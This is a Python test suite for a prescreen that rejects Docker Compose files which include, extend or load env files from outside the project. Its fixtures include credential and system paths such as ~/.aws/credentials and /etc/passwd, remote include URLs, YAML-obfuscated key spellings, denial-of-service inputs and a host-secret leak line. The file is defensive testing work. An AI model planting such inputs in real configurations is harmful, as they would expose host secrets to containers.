    "extends-file": "services:\n  a:\n    extends:\n      file: @BASE@\n      service: b\n",
    "extends-binary": "services:\n  a:\n    extends:\n      !!binary ZmlsZQ==: @BASE@\n      service: b\n",
}
# And the ones that are not valid YAML for Compose, or that it would not read, and that the screen refuses all the same
ODD = (
    "services:\n  a:\n    ?\tenv_file\n    : /outside\n", 'services:\n  a:\n    "env_\\\n      file": /outside\n',
    "include:\n  - ok.yml\n  - ../x]y\n  - /outside/inc.yml\n", "include:\n  - a, 'b\n  - /outside/inc.yml\n  - c'\n",
    "services:\n  a:\n    env_file: [a 'q, [ x 'r, y ],\n  /outside/secret.env]\n",
)
PLACES = {"@SECRET@": "/outside/secret.env", "@INC@": "/outside/inc.yml", "@BASE@": "/outside/base.yml"}


class Screen(Case):
    """T19: the text, before Compose is ever asked."""

    FILE = ".lab/catalogs/ns/addons/x/compose.yml"
    INCLUDE, FILES = trust.RULES["T19"]["lines"]

    def screen(self, text, file=None, **how):
        return trust.prescreen(text, file or self.FILE, **how)

    def test_a_clean_file_has_no_reason(self):
        for text in ("services:\n  a:\n    image: busybox\n", "", "include:\n  - ../../addons/a/compose.yml\nservices: {}\n",
                     "# env_file: /dev/zero\nservices: {}\n", "services:\n  a:\n    extends:\n      service: b\n",
                     "include:\n  - ../a/compose.yml   # optional: the add-ons it needs\n\nservices: {}\n",
                     "x-include: ../x\nincludes: /etc\nmy_env_file: /dev/zero\nservices: {}\n",
                     "services:\n  a:\n    environment: &env\n      <<: *other\n      K: *v\n    healthcheck:\n"
                     "      test: [\"CMD-SHELL\", \"curl -sf x | grep -Eq '\\\"healthy\\\" *: *true'\"]\n"):
            with self.subTest(text=text):
                self.assertEqual(self.screen(text), [])
                self.assertEqual(self.screen(text, follow=True), [])

    def test_a_clean_file_of_the_engine_is_clean(self):
        """The real units, as they sit in the engine today: the screen reads words, and none of these says one it refuses.
        (Gone with them when the content moves to its catalog, and then the units of that catalog are the ones to run.)"""
        files = sorted([*regen.ENGINE.glob("addons/*/compose.yml"), *regen.ENGINE.glob("playgrounds/*/compose.yml"),
                        *regen.ENGINE.glob("setups/*.yml")])
        files = [file for file in files if "local" not in file.relative_to(regen.ENGINE).parts]
        if not files:
            print("skipped: the engine holds no unit", file=sys.stderr)
            self.skipTest("the engine holds no unit")
        for file in files:
            with self.subTest(file=str(file.relative_to(regen.ENGINE))):
                where = ".lab/catalogs/gravitee/" + file.relative_to(regen.ENGINE).as_posix()
                self.assertEqual(self.screen(file.read_text(encoding="utf-8"), where), [])

    def test_a_word_in_a_sentence_or_a_comment_is_no_key(self):
        for text in ("# env_file: /etc/passwd\n  # include: /etc\nservices: {}\n",
                     "x-gravitee: {description: Why does it include everything ? And extends nothing}\n",
                     "x-gravitee: {description: Voulez-vous continuer ?}\nservices:\n  a:\n    command: echo ! hi, != yes !!\n",
                     "services:\n  a:\n    environment:\n      NOTE: \"use env_file or label_file here\"\n"):
            with self.subTest(text=text):
                self.assertEqual(self.screen(text), [])

    def test_t19_an_include_that_is_absolute_home_remote_a_variable_or_leaves_the_project(self):
        for target in ("/etc/passwd", "~/x.yml", "https://example.invalid/x.git", "git@example.invalid:o/r.git", "git://example.invalid/r",
                       "github.com/o/r", "oci://example.invalid/x", "${HOME}/x.yml", "$HOME/x.yml", "../../../../../../../etc/x.yml",
                       "C:\\x.yml", "\\\\host\\share\\x.yml"):
            with self.subTest(target=target):
                self.assertEqual(self.screen(f"include:\n  - {target}\n"), [self.INCLUDE])
                self.assertEqual(self.screen(f'include:\n  - "{target.replace(chr(92), chr(92) * 2)}"\n'), [self.INCLUDE])
                self.assertEqual(self.screen(f"include:\n  - '{target}'\n"), [self.INCLUDE])
                self.assertEqual(self.screen(f"include: [{target}]\n"), [self.INCLUDE])
                self.assertEqual(self.screen(f"include:\n  - path: {target}\n"), [self.INCLUDE])
                self.assertEqual(self.screen(f"include: {target}\n"), [self.INCLUDE])

    def test_t19_the_long_form_of_an_include_is_read_whole(self):
        self.assertEqual(self.screen("include:\n  - path: ../ok.yml\n    project_directory: /\n"), [self.INCLUDE])
        self.assertEqual(self.screen("include:\n  - path: ../ok.yml\n    env_file: /dev/zero\n"), [self.INCLUDE, self.FILES])
        self.assertEqual(self.screen("include:\n  - path: ../ok.yml\n    required: false\n"), [])
        self.assertEqual(self.screen("include:\n  - path:\n      - ../ok.yml\n      - /etc/x.yml\n"), [self.INCLUDE])
        self.assertEqual(self.screen("include:\n- path:\n  - /etc/x.yml\n"), [self.INCLUDE])

    def test_t19_every_line_break_of_yaml_ends_a_line(self):
        """NEL, the line and paragraph separators and a lone CR end a line for the parser Compose uses: a list under a key on
        the next line, or a key after a comment, is read as one."""
        for brk in ("\r", "\r\n", "\u0085", "\u2028", "\u2029"):
            for text in (f"include:{brk}  - /outside/inc.yml{brk}services: {{}}{brk}", f"include:{brk}- /outside/inc.yml{brk}",
                         f"include:{brk}  - path:{brk}      /outside/inc.yml{brk}", f"include: [a,{brk}  /outside/inc.yml]{brk}"):
                with self.subTest(text=text):
                    self.assertEqual(self.screen(text), [self.INCLUDE])
            for text in (f"services:{brk}  a:{brk}    env_file:{brk}      - /outside/x{brk}", f"services:{brk}  a:{brk}    env_file:{brk}      - ok.env{brk}"
                         f"      - path: /outside/x{brk}", f"services:{brk}  a:{brk}    env_file: [{brk}ok.env,{brk}/outside/x]{brk}"):
                with self.subTest(text=text):
                    self.assertEqual(self.screen(text, follow=True), [self.FILES])
            clean = f"include:{brk}  - ../ok.yml{brk}services: {{}}{brk}"
            self.assertEqual(self.screen(clean), [])

    def test_t19_a_file_a_service_reads_is_refused_until_the_caller_reads_it(self):
        """Compose reads an env_file into the environment, ${NAME} and all, and nothing in the resolved JSON shows it."""
        for key in ("env_file", "label_file"):
            for text in (f"services:\n  a:\n    {key}: ./a.env\n", f"services:\n  a:\n    {key}:\n      - ./a.env\n",
                         f"services:\n  a:\n    {key}: [a.env]\n", f'services: {{a: {{"{key}": "a.env"}}}}\n'):
                with self.subTest(text=text):
                    self.assertEqual(self.screen(text), [self.FILES])
                    self.assertEqual(self.screen(text, follow=True), [])
        # a plain name in a one-line flow is read two ways (`a.env}}` in a block), and the readings must agree
        self.assertEqual(self.screen("services: {a: {env_file: a.env}}\n", follow=True), [self.FILES])

    def test_t19_a_file_a_service_reads_stays_in_its_folder(self):
        for key in ("env_file", "label_file"):
            for target in ("/dev/zero", "~/.aws/credentials", "${HOME}/x", "../../b.env", "https://example.invalid/e", "../b.env"):
                with self.subTest(key=key, target=target):
                    for text in (f"services:\n  a:\n    {key}: {target}\n", f"services:\n  a:\n    {key}:\n      - ok.env\n      - {target}\n",
                                 f"services:\n  a:\n    {key}:\n    - {target}\n", f"services:\n  a:\n    {key}:\n      - path: {target}\n",
                                 f"services:\n  a:\n    {key}: [{target}]\n", f'services:\n  a:\n    {key}: "{target}"\n'):
                        self.assertEqual(self.screen(text, follow=True), [self.FILES], text)
        self.assertEqual(self.screen("services:\n  a:\n    env_file: sub/../ok.env\n", follow=True), [])
        self.assertEqual(self.screen("services:\n  a:\n    env_file:\n      - ./a.env\n      - path: b.env\n        required: false\n",
                                     follow=True), [])

    def test_t19_the_files_a_unit_names_are_the_ones_the_caller_reads(self):
        text = ("services:\n  a:\n    env_file:\n      - ./a.env\n      - path: sub/b.env\n        required: false\n"
                "  b:\n    env_file: [a.env, 'c.env']\n    label_file: \"d.env\"\n")
        folder = ".lab/catalogs/ns/addons/x"
        self.assertEqual(trust.env_files(text, self.FILE), [f"{folder}/a.env", f"{folder}/c.env", f"{folder}/d.env", f"{folder}/sub/b.env"])
        self.assertEqual(trust.env_files("services: {}\n", self.FILE), [])
        self.assertEqual(trust.env_files("env_file: /dev/zero\n", self.FILE), [])
        self.assertEqual(trust.env_files(text, ".lab/catalogs/ns/playgrounds/x/seed/a.yaml"), [])
        self.assertEqual(trust.env_files(None, self.FILE), [])

    FOLDER = ".lab/catalogs/ns/addons"   # where `../a/compose.yml` leads from the folder of FILE

    def targets(self, text, file=None):
        return trust.include_targets(text, file or self.FILE)

    def test_include_targets_are_the_files_of_every_list_of_names_the_screen_reads(self):
        a, b, c = (f"{self.FOLDER}/{name}/compose.yml" for name in "abc")
        for text, wanted in (
                ("services: {}\n", []), ("", []), ("# include: ../a/compose.yml\nservices: {}\n", []),
                ("services:\n  a:\n    command: |\n      first \\\n        second \\u00e9 \\x41\n", []),
                ("include:\n  - ../a/compose.yml\n  - ../b/compose.yml\nservices: {}\n", [a, b]),
                ("include:  # note\n  - path: ../a/compose.yml   # why\n  - \"../b/compose.yml\"\n  - '../c/compose.yml'\n"
                 "\n  # nothing\nservices: {}\n", [a, b, c]),
                ("include:\r\n  - ../a/compose.yml\r\nservices: {}\r\n", [a]), ("include:\r  - ../a/compose.yml\r", [a]),
                ("include:\u2028  - ../a/compose.yml\n", [a]), ("include:\n- ../a/compose.yml\n", [a]),
                ("include: [../a/compose.yml, ../b/compose.yml]\n", [a, b]), ("include: ../a/compose.yml\n", [a]),
                ("include:\n  - {path: ../a/compose.yml}\n", [a]), ("include:\n  - [../a/compose.yml]\n", [a]),
                ("include:\n  - path: [../a/compose.yml, ../b/compose.yml]\n", [a, b]),
                ("include:\n  - path:\n      - ../a/compose.yml\n      - ../b/compose.yml\n", [a, b]),
                ('"include": [../a/compose.yml]\n', [a]), ("'include':\n  - ../a/compose.yml\n", [a]),
                ("include:\n  - !!str ../a/compose.yml\n", [a]), ("include: &list\n  - ../a/compose.yml\n", [a]),
                ("include:\n  - ../a/compose.yml\n  - ../a/compose.yml\n  - ./../x/../a/compose.yml\n", [a]),
                ("include:\n  - ''\n  - ../a/compose.yml\n  - ../b/compose.yml #\n", [a, b]),
                ("include:\n  - ../a/compose.yml\ninclude:\n  - ../b/compose.yml\n", [a, b]),
                # an `include:` that is no key is no include: prose in a quoted scalar, a comment, a word that ends in the key
                ('x-gravitee: {description: "Does not include: files", name: x}\nservices: {}\n', []),
                ("x-gravitee:\n  description: \"Does not include: kafka\"\n  label: 'Does include: Kafka (optional)'\nservices: {}\n", []),
                ("services:\n  a:\n    image: x # include: ../a/compose.yml\n    command: [\"sh\", \"-c\", \"include: ../a/compose.yml\"]\n", []),
                ("x-include: ../a/compose.yml\nservices: {}\n", []),
                # and a real one in each place a key may stand
                ("{include: [../a/compose.yml]}\n", [a]),
                ("{\n  \"services\": {},\n  include: [../a/compose.yml]\n}\n", [a]), ("{a: 1, include: [../a/compose.yml]}\n", [a]),
                ("&top include: [../a/compose.yml]\n", [a]), ("!!str include: [../a/compose.yml]\n", [a]),
                ("\ufeffinclude:\n- ../a/compose.yml\n", [a]), ("\ufeff'include':\n  - ../a/compose.yml\n", [a]),
                ("x:\n  - include: [../a/compose.yml]\n", [a]),
                # a fold elsewhere in the file changes nothing of the keys that no fold or escape touches
                ("services:\n  a:\n    command: |\n      first \\\n        second \\u00e9 \\x41\ninclude:\n  - ../a/compose.yml\n", [a])):
            with self.subTest(text=text):
                self.assertEqual(self.targets(text), wanted)

    def test_include_targets_are_relative_to_the_folder_of_the_file(self):
        text = "include: [../a.yml, b.yml, ./c/../d.yml]\n"
        self.assertEqual(self.targets(text, "x/y/compose.yml"), ["x/a.yml", "x/y/b.yml", "x/y/d.yml"])
        self.assertEqual(self.targets(text, "x/compose.yml"), ["a.yml", "x/b.yml", "x/d.yml"])
        self.assertEqual(self.targets("include: [b.yml]\n", "compose.yml"), ["b.yml"])
        self.assertEqual(self.targets("include: [b.yml]\n", "x/setup.yaml"), ["x/b.yml"])

    def test_include_targets_say_none_for_what_the_screen_cannot_read_whole(self):
        for text in (
                "include:\n  - path: ../a/compose.yml\n    project_directory: /\n", "include:\n  - path: ../a/compose.yml\n    required: false\n",
                "include:\n  - path: ../a/compose.yml\n    env_file: x\n", "include:\n  - ../a/compose.yml\n    env_file: x\n",
                "include:\n  - *shared\n", "x-k: &k [../a.yml]\ninclude: *k\n", "include:\n  - a: b\n", "include:\n  - |\n    ../ok.yml\n",
                "include: [a, b\n", "include: '\n" + "a\n" * 500 + "'\n", "include: [\n" + "  ../ok.yml,\n" * 500 + "]\n",
                "include:\n  - a,b\n", "include:\n  - g[h\n", "include:\n  - a #\n  - b, [\n",
                "{include: [../a.yml], services: {}}\n",
                "include:\n  - ~\n", "include:\n  - null: x\n"):
            with self.subTest(text=text):
                self.assertIsNone(self.targets(text))

    def test_include_targets_say_none_for_a_name_that_yaml_reads_other_than_its_letters(self):
        """The walk of a closure follows these files and no others: a name read from its letters when YAML (Compose) reads
        another is a file nobody screened. Every text here is one that Compose reads as the name in the comment (the
        differential below asks Compose itself), and the answer is None for each."""
        for text in (
                "include:\n  - 'b\\x41.yml'\n",   # b\x41.yml: escapes are for double quotes only
                "include:\n  - b\\x41.yml\n", "include: [b\\x41.yml]\n", "include:\n  - path: 'b\\x41.yml'\n",
                'include:\n  - "b\\\\x41.yml"\n',   # b\x41.yml
                'include:\n  - "b\\x41.yml"\n', 'include:\n  - "b\\u0041.yml"\n',   # bA.yml: the letters are not the name
                'include:\n  - "b\\\n    .yml"\n', 'include:\n  - "b\\n.yml"\n', 'include: ["b\\x41.yml"]\n',
                'include:\n  - "b.yml "\n', "include:\n  - 'b.yml '\n", 'include:\n  - " b.yml"\n',   # the spaces are in the name
                'include: ["b.yml "]\n', "include: [' b.yml']\n", 'include:\n  - path: "b.yml "\n', "include:\n  - {path: 'b.yml '}\n",
                "include:\n  - b\n    .yml\n", "include:\n  - b\n     .yml\n", "include:\n  - b\n  .yml\n",   # one name, "b .yml"
                "include: [b\n  .yml]\n", "include: [b,\n  c.yml]\n", "include:\n  - 'b'\n    c\n", "include:\n  - b.yml \\\n    c\n",
                "include:\n  - :,\n", "include:\n  - path: :,\n", "include: [:,]\n", "include:\n  - :]\n", "include:\n  - :[\n",   # the name ":,"
                "include:\n  - b.yml:\n", "include:\n  - 'b.yml':\n", "include:\n  - : b.yml\n",
                "include: b.yml\n  - c.yml\n", "include: b.yml\n    c.yml\n", "include: [b.yml]\n  - c.yml\n",   # "b.yml - c.yml"
                "include: &l\n  - b.yml\n      - c.yml\n", "include:\n  - b.yml\n      - c.yml\n", "include:\n  - path: b.yml\n      - c.yml\n",
                "include:\n  - a b.yml\n", "include:\n  - 'a b.yml'\n", "include:\n  - a=b.yml\n", "include:\n  - a%20b.yml\n",
                "include:\n  - a\u00a0b.yml\n", "include:\n  - a\x0bb.yml\n",
                "include:\n  - path:\n      b.yml\n      c.yml\n", "include:\n  path: b.yml\n", "include:\n  - b.yml\n  c.yml\n",
                "include:\n  - !<tag:x> b.yml\n", "include:\n  - &a,b c.yml\n", "include:\n  - !a,b c.yml\n"):
            with self.subTest(text=text):
                self.assertIsNone(self.targets(text))
        for text, wanted in (("include:\n  - b.yml\n", ["b.yml"]), ("include: [b.yml, 'c.yml', \"d.yml\"]\n", ["b.yml", "c.yml", "d.yml"]),
                             ("include:\n  - path: b.yml\n  - path:\n      - c.yml\n", ["b.yml", "c.yml"]),
                             ("include:\n  - b.yml\n  - path: [c.yml]\n  - {path: d.yml}\n", ["b.yml", "c.yml", "d.yml"]),
                             ("include:\n  - a-b_c.d/e+f@g.yml\n", ["a-b_c.d/e+f@g.yml"])):
            with self.subTest(text=text):
                self.assertEqual(self.targets(text, "compose.yml"), wanted)

    def test_include_targets_say_none_for_a_key_that_an_escape_or_a_fold_spells(self):
        """An `include` that only a replaced escape or a joined fold spells is not read: the walk cannot say what it names, so
        the file is held. That includes a decoy: the same words stand somewhere else in the file, where no key reads them."""
        for text in (
                '"inclu\\u0064e": [../a/compose.yml]\n', '"inc\\\nlude": [../a/compose.yml]\n', '"inc\\x6cude":\n  - ../a/compose.yml\n',
                "x:\n  \"inclu\\U00000064e\": [../a/compose.yml]\n", "x: [\"inc\\x6cude\": [../a/compose.yml]]\n",
                # a line that ends in a backslash is joined to the next by the reading that spells keys, and YAML does not join it
                "x: abc\\\ninclude:\n  - ../a/compose.yml\nservices: {}\n", "x: abc \\\n include: [../a/compose.yml]\n",
                "x: abc\\\n\"inc\\u006cude\":\n  - ../a/compose.yml\n", "x: abc\\\n\"inc\\\nlude\":\n  - ../a/compose.yml\n",
                # the decoy: a plain include of the name the escape spells, where the escaped key names another file
                "x-decoy: {include: [bA.yml]}\n\"inc\\x6cude\": [b\\x41.yml]\n", "x-decoy: {include: [bA.yml]}\nx: abc\\\n\"inclu\\u0064e\": [b\\x41.yml]\n"):
            with self.subTest(text=text):
                self.assertIsNone(self.targets(text))
        for text in ("services:\n  a:\n    command: \"printf '\\x41'\"\ninclude:\n  - ../a/compose.yml\n",
                     "services:\n  a:\n    command: |\n      one \\\n        two\ninclude:\n  - ../a/compose.yml\n"):
            self.assertEqual(self.targets(text), [f"{self.FOLDER}/a/compose.yml"], "an escape or a fold that touches no key changes nothing")

    def test_a_backslash_that_ends_a_line_hides_no_key_from_the_screen(self):
        """YAML folds a line that ends in a backslash only inside a double-quoted scalar. Anywhere else the next line stands
        alone, so a key can sit on it: a screen that joined the two (to read "env_\\<newline>file") read `abcinclude:` and saw
        no key. Each text here has a real key on its own line, and T19 refuses it as it refuses the same text with no
        backslash."""
        keyed = (("include:\n  - /etc/passwd", self.INCLUDE), ("include: [/etc/passwd]", self.INCLUDE),
                 ("services:\n  a:\n    env_file: /dev/zero", self.FILES), ("services:\n  a:\n    label_file: /dev/zero", self.FILES),
                 ("services:\n  a:\n    extends:\n      file: other.yml", self.FILES))
        for keyed_text, line in keyed:
            for hider in ("x: abc\\\n", "x: abc \\\n", "services:\n  a:\n    image: q\n    labels: a\\\n", "x: 'don''t\\\n",
                          "x: \\\n", "x: abc\\\n  \n"):
                for before in ("", "\n"):
                    text = f"{hider}{before}{keyed_text}\n"
                    with self.subTest(text=text):
                        self.assertEqual(self.screen(text), [line])
        # the escaped spelling and the explicit key, after a backslash that ends a line
        for text, line in (('x: abc\\\n"inc\\u006cude":\n  - /etc/passwd\n', self.INCLUDE),
                           ('x: abc\\\nservices:\n  a:\n    "env_\\x66ile": /dev/zero\n', self.FILES),
                           ('x: abc\\\n"inc\\\nlude":\n  - /etc/passwd\n', self.INCLUDE),
                           ("x: foo\\\n? include\n: [/etc/passwd]\n", self.FILES)):
            with self.subTest(text=text):
                self.assertEqual(self.screen(text), [line])
        self.assertEqual(self.screen("x: abc\\\nservices: {}\n"), [], "and a backslash alone costs nothing")

    def test_a_byte_order_mark_does_not_move_the_first_key(self):
        """A mark at the start of a file is not part of its first line: the list under `include:` is at the key's column,
        and a key that the mark pushed to column 1 read no rows."""
        self.assertEqual(self.screen("\ufeffinclude:\n- /etc/passwd\nservices: {}\n"), [self.INCLUDE])
        self.assertEqual(self.screen("\ufeffinclude:\n  - /etc/passwd\n"), [self.INCLUDE])
        self.assertEqual(self.screen("\ufeffinclude:\n- ../ok.yml\nservices: {}\n"), [])
        self.assertEqual(self.targets("\ufeffinclude:\n- ../a/compose.yml\n"), [f"{self.FOLDER}/a/compose.yml"])

    def test_the_readings_of_a_text_are_its_letters_with_and_without_the_folds_and_escapes(self):
        self.assertEqual(trust._readings("a: 1\nb: 2\n"), [(["a: 1", "b: 2", ""], [False, False, False])])
        found = trust._readings('x: abc\\\n"env_\\x66ile": z\ny: "\\x41\\\n  b"\n')
        self.assertEqual([lines for lines, _ in found], [
            ['x: abc"env_file": z', 'y: "Ab"', ''],
            ['x: abc\\', '"env_\\x66ile": z', 'y: "\\x41\\', '  b"', ''],
            ['x: abc\\', '"env_file": z', 'y: "A\\', '  b"', '']])
        self.assertEqual([made for _, made in found], [[True, True, False], [False] * 5, [False, True, True, False, False]])
        self.assertEqual(trust._readings("\ufeffa: 1\r\nb: 2\r"), [(["a: 1", "b: 2", ""], [False, False, False])], "no mark, one break")

    def test_unescaped_is_the_folds_and_escapes_of_the_reading_that_spells_keys(self):
        """The reading `unescaped` gives is the one `_decoded` makes line by line (the flags say which lines it made): the
        replacement of the escapes after the folds, a fold only for a backslash that is not already consumed by a fold."""
        rng = random.Random(7)
        pieces = ["a", "include", ":", " ", "\t", "\\", "\n", "\r\n", "\r", "\\x41", "\\x4", "\\u0041", "\\U00000041", "\\U7fffffff",
                  "\\x0a", "\u2028", "\u0085", "-", "  ", "'", '"', "#", "\\\n", "\\\n  ", "\\\\\n"]

        def once(text):
            def one(found):
                try:
                    return chr(int(next(group for group in found.groups() if group), 16))
                except (ValueError, OverflowError):
                    return " "
            return trust._ESCAPE.sub(one, re.sub(r"\\\n[ \t]*", "", trust._BREAK.sub("\n", text)))
        for _ in range(4000):
            text = "".join(rng.choice(pieces) for _ in range(rng.randint(0, 14)))
            lines, made = trust._decoded(trust._plain(text))
            self.assertEqual(trust.unescaped(text), once(text).lstrip("\ufeff") if text.startswith("\ufeff") else once(text), repr(text))
            self.assertEqual(len(lines), len(made))
            self.assertEqual(not any(made), lines == trust._plain(text).split("\n"), repr(text))

    def test_include_targets_say_none_for_a_name_that_is_not_a_file_of_the_project(self):
        for target in ("/etc/passwd", "~/x.yml", "https://example.invalid/x.git", "git@example.invalid:o/r.git", "git://example.invalid/r",
                       "github.com/o/r", "oci://example.invalid/x", "${HOME}/x.yml", "$HOME/x.yml", "../../../../../../../etc/x.yml",
                       "C:\\x.yml", "\\\\host\\share\\x.yml"):
            for text in (f"include:\n  - {target}\n", f'include:\n  - "{target.replace(chr(92), chr(92) * 2)}"\n', f"include: [{target}]\n",
                         f"include:\n  - path: {target}\n", f"include: {target}\n", f"include:\n  - ../a/compose.yml\n  - {target}\n"):
                with self.subTest(text=text):
                    self.assertIsNone(self.targets(text))
        self.assertEqual(self.targets("include:\n  - ../../../../../x.yml\n"), ["x.yml"], "the project's own root is a file of it")
        self.assertIsNone(self.targets("include:\n  - ../../../../../../x.yml\n"))

    def test_include_targets_say_none_for_a_file_that_is_not_one_the_screen_reads(self):
        text = "include:\n  - ../a/compose.yml\n"
        for file in (None, "", "compose.json", "guide.md", "compose.yml.bak", ".lab/catalogs/ns/addons/x/.env"):
            with self.subTest(file=file):
                self.assertIsNone(trust.include_targets(text, file))
        self.assertEqual(trust.include_targets(text, "x/compose.yaml"), ["a/compose.yml"])
        big = "x: " + "a" * trust.MAX_FILE + "\n"
        self.assertIsNone(self.targets(big))
        self.assertEqual(self.targets("x: " + "a" * 1000 + "\n"), [])
        for nothing in (None, 0, b"x", [], {}):
            self.assertEqual(self.targets(nothing), [], "no text includes nothing")
        for bytes_ in (text.encode("utf-16"), text.encode("utf-16-le")):
            for errors in ("replace", "surrogateescape"):
                self.assertIsNone(self.targets(bytes_.decode("utf-8", errors)))
        self.assertIsNone(self.targets("include:\n  - ../a/compose.yml\n# \x00\n"))
        self.assertIsNone(self.targets("include:\n  - ../a/compose.yml\nx: \ufffd\n"))

    def test_include_targets_say_none_for_a_text_that_can_spell_the_key_without_its_letters(self):
        for name, template in HIDDEN.items():
            if "include" not in name:
                continue
            text = template
            for place, written in (("@INC@", "../ok.yml"),):
                text = text.replace(place, written)
            with self.subTest(spelling=name):
                found = self.targets(text)
                self.assertIn(found, (None, [f"{self.FOLDER}/ok.yml"]), "never [], which would say it includes nothing")
        for text in ("include:\n  - ?\n      path\n    : ../ok.yml\nservices: {}\n", "x-k: &k path\ninclude:\n  - *k : ../ok.yml\n",
                     "!!binary aW5jbHVkZQ==:\n  - ../ok.yml\n", "include:\n  - !!binary Li4vb2sueW1s\n",
                     "%TAG !b! tag:yaml.org,2002:bin\n---\ninclude:\n  - !b!ary Li4vb2sueW1s\n",
                     "services: {}\u0085# note\u0085include: [../ok.yml]\n", "services: {}\r# note\rinclude: [../ok.yml]\n"):
            with self.subTest(text=text):
                self.assertIn(self.targets(text), (None, [f"{self.FOLDER}/ok.yml"]))
        for text in ("include:\n  - ?\n      path\n    : ../ok.yml\nservices: {}\n", "!!binary aW5jbHVkZQ==:\n  - ../ok.yml\n",
                     "x-k: &k path\ninclude:\n  - *k : ../ok.yml\n"):
            self.assertIsNone(self.targets(text), "a key spelled without its letters is never taken for none")

    def test_include_targets_never_name_an_include_that_the_screen_refuses(self):
        """The two read the same words: a text that T19 refuses for its includes (a place that is not the project's, a value it
        cannot read whole) is a text whose includes are not named, so that nothing it refused is followed."""
        texts = []
        for target in ("/etc/passwd", "~/x.yml", "https://example.invalid/x.git", "git@example.invalid:o/r.git", "github.com/o/r",
                       "${HOME}/x.yml", "../../../../../../../etc/x.yml", "C:\\x.yml"):
            texts += [f"include:\n  - {target}\n", f"include: [{target}]\n", f"include:\n  - path: {target}\n",
                      f"include:\n  - ../ok.yml\n  - {target}\n", f"include: {target}\n", f"include:\n  - path: ../ok.yml\n    project_directory: {target}\n"]
        texts += [template.replace("@INC@", "/outside/inc.yml") for name, template in HIDDEN.items() if "include" in name]
        texts += [text for text in ODD if "include" in text]
        texts += ["include:\n  - a, 'b\n  - /outside/inc.yml\n  - c'\n", "include:\n  - g]h\n  - /outside/inc.yml\n",
                  "include:\n  - a[b\n  - /outside/inc.yml\n", "include:\n  - {x\n  - /outside/inc.yml\n", "include:\n  - a #\n  - /outside/inc.yml\n",
                  "include:\n  - it's\n  - /outside/inc.yml\n", "include: [a 'q, [ x 'r, y ],\n  /outside/inc.yml]\n",
                  "include: [\"]\",\n /outside/inc.yml]\n", "include: ['a\n  b', /outside/inc.yml]\n", "include:\n  - |\n    ../ok.yml\n",
                  "x: &z /etc/passwd\ninclude:\n  - *z\n", "include: [\n" + "  ../ok.yml,\n" * 500 + "]\n"]
        for text in texts:
            with self.subTest(text=text):
                self.assertTrue(self.screen(text), "T19 refuses it, with the line of an include or the line of a hidden key")
                self.assertIsNone(self.targets(text))
        self.assertGreater(len(texts), 60)

    def test_include_targets_with_every_spelling_in_every_place_find_the_file_or_say_none(self):
        """The cross product of how `include` is spelled and what follows it, run against a file of the project: what is read is
        read whole, and the rest is none, never an empty list."""
        wanted = [f"{self.FOLDER}/ok.yml"]
        read = 0
        for spelling in ("{k}", '"{k}"', "'{k}'", "&a {k}", "!!str {k}", '"inc\\x6cude"', '"inc\\u006cude"', "{k} ", "{k}\t"):
            for value in ("../ok.yml", '"../ok.yml"', "'../ok.yml'", "[../ok.yml]", "\n  - ../ok.yml", "\n  - path: ../ok.yml",
                          "\n  - {path: ../ok.yml}", "[a, '../ok.yml']", "!!str ../ok.yml", "&p ../ok.yml", "../ok.yml  # note 'x \"y"):
                head, space = spelling.format(k="include"), "" if value.startswith("\n") else " "
                for text in (f"{head}:{space}{value}\nservices: {{}}\n", f"x: 1\n{head}:{space}{value}\n"):
                    found = self.targets(text)
                    self.assertTrue(found is None or "../ok.yml" in value and wanted[0] in found, repr(text))
                    self.assertNotEqual(found, [], repr(text))
                    read += found is not None
        self.assertGreater(read, 100, "most of them are read")

    def test_include_targets_cost_little_whatever_the_text_is(self):
        n = 6000
        attacks = ("include:\n" + "  - ../a.yml\n" * 30000, "x: {" + ", ".join("include: a" for _ in range(n * 5)) + "}\n",
                   "include: " + "- a, " * 80000, "include: " + "'a " * 80000, "include: '\n" + "a\n" * 50000, "x: " + "*a : " * 50000,
                   "x: " + ", ? " * 50000, "x: " + " " * 400000 + "include: a\n", "include: " + "a: " * 50000,
                   "".join(" " * (number % 400) + "include:\n" for number in range(3000)),
                   ("include:\n" + "  - a.yml\n" * 200) * 150, "include: " + "[" * 50000 + "]" * 50000, "include:\n" + "- " * 100000 + "\n",
                   # a chain of folds is one line to join: it is joined once, not once for each line
                   "a\\\n" * 60000 + "include: [b.yml]\n", "\\\n" * 60000, "x: \"" + "\\x41" * 60000 + "\"\ninclude: [b.yml]\n",
                   "\\\n  " * 30000 + "\"inc\\x6cude\": [b.yml]\n")
        for text in attacks:
            started = time.process_time()
            self.targets(text)
            self.assertLess(time.process_time() - started, 3.0, text[:60])
            started = time.process_time()
            self.screen(text)
            self.assertLess(time.process_time() - started, 3.0, text[:60])

    def test_t19_a_quoted_file_name_is_read_with_its_spaces_and_a_name_seen_two_ways_is_both(self):
        """A quoted name is the name between the quotes: the file a service reads is `a.env ` with its space. A key an escape
        spells and a key on the line after a backslash are read from the text as each reading has it, and the files either
        names are the ones to read."""
        folder = ".lab/catalogs/ns/addons/x"
        self.assertEqual(trust.env_files('services:\n  a:\n    env_file: "a.env "\n', self.FILE), [f"{folder}/a.env "])
        self.assertEqual(trust.env_files("services:\n  a:\n    env_file: [' a.env', b.env]\n", self.FILE),
                         [f"{folder}/ a.env", f"{folder}/b.env"])
        self.assertEqual(trust.env_files("x: abc\\\nservices:\n  a:\n    env_file: a.env\n", self.FILE), [f"{folder}/a.env"])
        self.assertEqual(trust.env_files('x: abc\\\nservices:\n  a:\n    "env_\\x66ile": a.env\n', self.FILE), [f"{folder}/a.env"])

    def test_the_lexer_says_when_it_does_not_follow_a_spelling(self):
        for text, odd in (("a.yml", False), ("'a.yml'", False), ('"a.yml"', False), ("&a a.yml", False), ("!!str a.yml", False),
                          ("!tag a.yml", False), ('"a\\x41.yml"', True), ('"a\\\\b"', True), ("'a\\x41'", False), (":,", True), (": a", True),
                          ("!<tag:x> a", True), ("!tag:x a", True), ("a: b", False), ("[a, b]", False), ("{a: b}", False),
                          ('{"a": b}', False)):
            with self.subTest(text=text):
                lex = trust._Lex(False)
                lex.feed(text)
                self.assertEqual(lex.odd, odd)
        lex = trust._Lex(False)
        lex.feed("'a")
        lex.feed("   b  '")
        self.assertEqual(lex.tokens, [("s", "a b  ")], "a folded line keeps what is at the ends of the scalar")

    def test_t19_what_the_files_it_names_read_is_t20(self):
        """The contract with the caller: put these texts through reads(), or `${NAME}` in an env file reads the shell and the
        .env files with no reason given (T20)."""
        self.assertEqual(trust.reads(["LEAK=${SOME_HOST_SECRET}\nOTHER=$MORE\nPLAIN=1\n"]), ["MORE", "SOME_HOST_SECRET"])

